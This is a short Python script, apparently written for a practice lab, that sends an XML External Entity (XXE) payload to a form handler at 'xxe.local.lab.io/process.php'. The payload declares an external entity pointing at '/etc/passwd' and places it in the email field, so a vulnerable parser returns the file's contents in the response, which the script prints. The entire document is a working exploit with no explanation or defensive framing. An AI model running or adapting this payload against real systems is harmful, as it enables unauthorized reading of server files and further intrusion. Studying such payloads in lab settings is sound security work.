import  requests

s = requests.session()

payload = """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><name>asasa</name><tel>sasa</tel><email>&xxe;</email><password>sasasas</password></root>"""


target = "http://xxe.local.lab.io/process.php"

res = s.post(target, data=payload).text 

print(res)
